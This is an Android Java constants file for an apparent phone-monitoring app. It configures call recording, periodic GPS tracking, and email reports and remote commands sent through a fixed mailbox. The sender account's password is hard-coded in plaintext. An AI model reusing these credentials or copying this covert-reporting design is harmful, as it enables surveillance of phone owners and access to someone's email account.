package com.yangshuo.myshieldhome;

import android.app.AlarmManager;
import android.os.Environment;
import android.widget.TextView;

import java.io.File;

/**
 * Created by yangshuo on 2018/1/19.
 */

public final class CommonParams {
//    public static String deviceID = "";
    public static final String deviceName = "新设备";
    public static File path = Environment.getExternalStoragePublicDirectory(/*Environment.DIRECTORY_DOWNLOADS*/ "MyShieldRecords");
    public static String cfgFileName = "configuration.txt";
    public static String pendingListName = "PendingList.txt";
    public static String GPSinfoFileName = "GPSinfo.txt";
    public static String GPSinfoPendingListName = "GPSinfoPendingList.txt";
    public static String typeX900 = "X900";
    public static String type360 = "360";
    public static int GPSinterval = 10;//默认定位时间间隔10分钟
    public static double INVALID_LOCATION = 0D;
    public static boolean bUseAlarmManager = true;

    public static String TXT_ONCREATE = "OnCreate=";
    public static final String MAIL_RECV_NAME = "51410710@qq.com";//"13911016798@139.com";
    public static final String MAIL_SENDER_NAME = "13911016798@139.com";//"13718505237@139.com";//"51410710@qq.com";
    public static final String MAIL_SENDER_PASS = "810426ys";//mznaibiymkcbcadh
    public static final String MAIL_SMTP_HOST =  "smtp.139.com";//"smtp.qq.com"; // port=25, SSL port=465
 //   public static final String MAIL_POP3_IMAP_HOST = "pop.139.com";//"pop.qq.com"; // port=110, SSL port=995
    public static final String MAIL_POP3_IMAP_HOST = "imap.139.com";//"imap.qq.com"; // port=143, SSL port=993
    //都加到MailManager的receiveMail()里面
    public static final String MAIL_TITLE_NOTIFY = "上线.";
    public static final String MAIL_TITLE_RECORD = "电话录音";
    public static final String MAIL_TITLE_HEARTBEAT = "HEARTBEAT.";
    public static final String MAIL_TITLE_COMMAND = "电话指令.ID.";//电话指令.ID.1234567890.UPDATE.XXXX
    public static final String MAIL_TITLE_COMMAND_RECV = "确认收到.ID.";//确认收到.电话指令.ID.1234567890.UPDATE.XXXX
    public static final String MAIL_TITLE_GPS_LOCATE_SUCCEED = "定位成功.";
    public static final String MAIL_TITLE_GPS_LOCATE_FAILED = "定位失败.";
    public static final String MAIL_TITLE_GPS_INFO_MULTI = ".多个日期";
    public enum MailJobEnum {
        CLEAN_OUTBOX,
        RECV_COMMAND,
        GET_GPS_FROM_OUTBOX
    }
    public enum ReportModeEnum {
        FIX_TIME_REPORT, //固定时间上报
        REAL_TIME_REPORT //实时上报
    }
    public static String CMD_UPDATE = "UPDATE";
    public static String PARAM_NAME = "name=";
    public static String PARAM_TYPE = "type=";
    public static String PARAM_SYSRECORDER = "sysRecorder=";
    public static String PARAM_GPSSERVICE = "startGPS=";
    public static String PARAM_GPS_INTERVAL = "GPSinterval=";
    public static String PARAM_GPS_MODE = "GPSreportTime=";
    public static String TXT_GPS_MODE_DEFAULT = "default";
    public static String PARAM_GPS_MODE_FLAG = "GPSreportFlag=";
    public static String SUB_PARAM_TIME = "time=";
    public static String SUB_PARAM_LONGITUDE = "Longitude=";
    public static String SUB_PARAM_LATITUDE = "Latitude=";
    public static String PARAM_REPORT_LONGITUDE = "LastReportLongitude=";
    public static String PARAM_REPORT_LATITUDE = "LastReportLatitude=";
    public static final String TXT_GPS_REPORT_HEADER = "****定位数据开始****\n";
    public static final String TXT_GPS_REPORT_FOOTER = "****定位数据结束****\n";

    public static String PATTERN_DATE_FORMAT = "yyyy-MM-dd HH:mm:ss";
    public static String PATTERN_COMMA_SPLIT = ",";

    public static double fenceScope = 0.003D;//300m, 不打开GPS的误差范围
}
